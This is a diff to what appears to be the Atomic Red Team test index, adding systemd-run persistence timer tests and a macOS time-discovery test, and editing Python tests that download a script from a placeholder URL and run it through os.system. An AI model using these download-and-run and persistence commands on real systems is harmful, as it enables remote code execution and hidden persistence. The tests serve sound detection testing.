@@ -19036,6 +19036,66 @@ privilege-escalation:
           rm #{path_to_systemd_timer}
           systemctl daemon-reload
         name: bash
+    - name: Create a user level transient systemd service and timer
+      auto_generated_guid: 3de33f5b-62e5-4e63-a2a0-6fd8808c80ec
+      description: "Schedule a user level transient task (will not survive a reboot)
+        without having to create the .timer or .service files by using the systemd-run
+        command. \n"
+      supported_platforms:
+      - linux
+      dependency_executor_name: sh
+      dependencies:
+      - description: 'Check if systemd-run exists on the machine
+
+'
+        prereq_command: 'if [ -x "$(command -v systemd-run)" ]; then exit 0; else
+          exit 1; fi;
+
+'
+        get_prereq_command: 'echo "Install systemd on the machine."; exit 1;
+
+'
+      executor:
+        elevation_required: false
+        command: 'systemd-run --user --unit=Atomic-Red-Team --on-calender ''*:0/1''
+          /bin/sh -c ''echo "$(date) $(whoami)" >>/tmp/log''
+
+'
+        cleanup_command: |
+          systemctl --user stop Atomic-Red-Team.service
+          systemctl --user stop Atomic-Red-Team.timer
+          rm /tmp/log
+        name: sh
+    - name: Create a system level transient systemd service and timer
+      auto_generated_guid: d3eda496-1fc0-49e9-aff5-3bec5da9fa22
+      description: "Schedule a system level transient task (will not survive a reboot)
+        without having to create the .timer or .service files by using the systemd-run
+        command. \n"
+      supported_platforms:
+      - linux
+      dependency_executor_name: sh
+      dependencies:
+      - description: 'Check if systemd-run exists on the machine
+
+'
+        prereq_command: 'if [ -x "$(command -v systemd-run)" ]; then exit 0; else
+          exit 1; fi;
+
+'
+        get_prereq_command: 'echo "Install systemd on the machine."; exit 1;
+
+'
+      executor:
+        elevation_required: true
+        command: 'systemd-run --unit=Atomic-Red-Team --on-calender ''*:0/1'' /bin/sh
+          -c ''echo "$(date) $(whoami)" >>/tmp/log''
+
+'
+        cleanup_command: |
+          systemctl stop Atomic-Red-Team.service
+          systemctl stop Atomic-Red-Team.timer
+          rm /tmp/log
+        name: sh
   T1055.003:
     technique:
       created: '2020-01-14T01:28:32.166Z'
@@ -48580,6 +48640,66 @@ persistence:
           rm #{path_to_systemd_timer}
           systemctl daemon-reload
         name: bash
+    - name: Create a user level transient systemd service and timer
+      auto_generated_guid: 3de33f5b-62e5-4e63-a2a0-6fd8808c80ec
+      description: "Schedule a user level transient task (will not survive a reboot)
+        without having to create the .timer or .service files by using the systemd-run
+        command. \n"
+      supported_platforms:
+      - linux
+      dependency_executor_name: sh
+      dependencies:
+      - description: 'Check if systemd-run exists on the machine
+
+'
+        prereq_command: 'if [ -x "$(command -v systemd-run)" ]; then exit 0; else
+          exit 1; fi;
+
+'
+        get_prereq_command: 'echo "Install systemd on the machine."; exit 1;
+
+'
+      executor:
+        elevation_required: false
+        command: 'systemd-run --user --unit=Atomic-Red-Team --on-calender ''*:0/1''
+          /bin/sh -c ''echo "$(date) $(whoami)" >>/tmp/log''
+
+'
+        cleanup_command: |
+          systemctl --user stop Atomic-Red-Team.service
+          systemctl --user stop Atomic-Red-Team.timer
+          rm /tmp/log
+        name: sh
+    - name: Create a system level transient systemd service and timer
+      auto_generated_guid: d3eda496-1fc0-49e9-aff5-3bec5da9fa22
+      description: "Schedule a system level transient task (will not survive a reboot)
+        without having to create the .timer or .service files by using the systemd-run
+        command. \n"
+      supported_platforms:
+      - linux
+      dependency_executor_name: sh
+      dependencies:
+      - description: 'Check if systemd-run exists on the machine
+
+'
+        prereq_command: 'if [ -x "$(command -v systemd-run)" ]; then exit 0; else
+          exit 1; fi;
+
+'
+        get_prereq_command: 'echo "Install systemd on the machine."; exit 1;
+
+'
+      executor:
+        elevation_required: true
+        command: 'systemd-run --unit=Atomic-Red-Team --on-calender ''*:0/1'' /bin/sh
+          -c ''echo "$(date) $(whoami)" >>/tmp/log''
+
+'
+        cleanup_command: |
+          systemctl stop Atomic-Red-Team.service
+          systemctl stop Atomic-Red-Team.timer
+          rm /tmp/log
+        name: sh
   T1542.005:
     technique:
       external_references:
@@ -56810,6 +56930,18 @@ discovery:
 
 '
         name: powershell
+    - name: System Time Discovery in macOS
+      auto_generated_guid: f449c933-0891-407f-821e-7916a21a1a6f
+      auto_generate_guid: 
+      description: "Identify system time. Upon execution, the local computer system
+        time and timezone will be displayed. \n"
+      supported_platforms:
+      - macos
+      executor:
+        command: 'date
+
+'
+        name: sh
   T1497.003:
     technique:
       id: attack-pattern--4bed873f-0b7d-41d4-b93a-b6905d1f90b0
@@ -63222,17 +63354,15 @@ execution:
       - description: Verify if python is in the environment variable path and attempt
           to import requests library.
         prereq_command: |
-          which_python=`which python`; python -V
+          which_python=$(which python || which python3 || which python2); $which_python -V
           $which_python -c 'import requests' 2>/dev/null; echo $?
         get_prereq_command: 'pip install requests
 
 '
       executor:
-        command: '$which_python -c ''import requests;import os;url = "#{script_url}";malicious_command
-          = "#{executor} #{payload_file_name} #{script_args}";session = requests.session();source
-          = session.get(url).content;fd = open("#{payload_file_name}", "wb+");fd.write(source);fd.close();os.system(malicious_command)''
-
-'
+        command: |
+          which_python=$(which python || which python3 || which python2)
+          $which_python -c 'import requests;import os;url = "#{script_url}";malicious_command = "#{executor} #{payload_file_name} #{script_args}";session = requests.session();source = session.get(url).content;fd = open("#{payload_file_name}", "wb+");fd.write(source);fd.close();os.system(malicious_command)'
         name: sh
         cleanup_command: "rm #{payload_file_name}  \n"
     - name: Execute Python via scripts (Linux)
@@ -63270,11 +63400,12 @@ execution:
 
 '
         prereq_command: |
-          which_python=`which python`; python -V
+          which_python=$(which python || which python3 || which python2); $which_python -V
           $which_python -c 'import requests' 2>/dev/null; echo $?
         get_prereq_command: "pip install requests    \n"
       executor:
         command: |
+          which_python=$(which python || which python3 || which python2)
           echo 'import requests' > #{python_script_name}
           echo 'import os' >> #{python_script_name}
           echo 'url = "#{script_url}"' >> #{python_script_name}
@@ -63330,11 +63461,12 @@ execution:
 
 '
         prereq_command: |
-          which_python=`which python`; python -V
+          which_python=$(which python || which python3 || which python2); $which_python -V
           $which_python -c 'import requests' 2>/dev/null; echo $?
         get_prereq_command: "pip install requests    \n"
       executor:
         command: |
+          which_python=$(which python || which python3 || which python2)
           echo 'import requests' > #{python_script_name}
           echo 'import os' >> #{python_script_name}
           echo 'url = "#{script_url}"' >> #{python_script_name}
@@ -64208,6 +64340,66 @@ execution:
           rm #{path_to_systemd_timer}
           systemctl daemon-reload
         name: bash
+    - name: Create a user level transient systemd service and timer
+      auto_generated_guid: 3de33f5b-62e5-4e63-a2a0-6fd8808c80ec
+      description: "Schedule a user level transient task (will not survive a reboot)
+        without having to create the .timer or .service files by using the systemd-run
+        command. \n"
+      supported_platforms:
+      - linux
+      dependency_executor_name: sh
+      dependencies:
+      - description: 'Check if systemd-run exists on the machine
+
+'
+        prereq_command: 'if [ -x "$(command -v systemd-run)" ]; then exit 0; else
+          exit 1; fi;
+
+'
+        get_prereq_command: 'echo "Install systemd on the machine."; exit 1;
+
+'
+      executor:
+        elevation_required: false
+        command: 'systemd-run --user --unit=Atomic-Red-Team --on-calender ''*:0/1''
+          /bin/sh -c ''echo "$(date) $(whoami)" >>/tmp/log''
+
+'
+        cleanup_command: |
+          systemctl --user stop Atomic-Red-Team.service
+          systemctl --user stop Atomic-Red-Team.timer
+          rm /tmp/log
+        name: sh
+    - name: Create a system level transient systemd service and timer
+      auto_generated_guid: d3eda496-1fc0-49e9-aff5-3bec5da9fa22
+      description: "Schedule a system level transient task (will not survive a reboot)
+        without having to create the .timer or .service files by using the systemd-run
+        command. \n"
+      supported_platforms:
+      - linux
+      dependency_executor_name: sh
+      dependencies:
+      - description: 'Check if systemd-run exists on the machine
+
+'
+        prereq_command: 'if [ -x "$(command -v systemd-run)" ]; then exit 0; else
+          exit 1; fi;
+
+'
+        get_prereq_command: 'echo "Install systemd on the machine."; exit 1;
+
+'
+      executor:
+        elevation_required: true
+        command: 'systemd-run --unit=Atomic-Red-Team --on-calender ''*:0/1'' /bin/sh
+          -c ''echo "$(date) $(whoami)" >>/tmp/log''
+
+'
+        cleanup_command: |
+          systemctl stop Atomic-Red-Team.service
+          systemctl stop Atomic-Red-Team.timer
+          rm /tmp/log
+        name: sh
   T1059.004:
     technique:
       id: attack-pattern--a9d4b653-6915-42af-98b2-5758c4ceee56
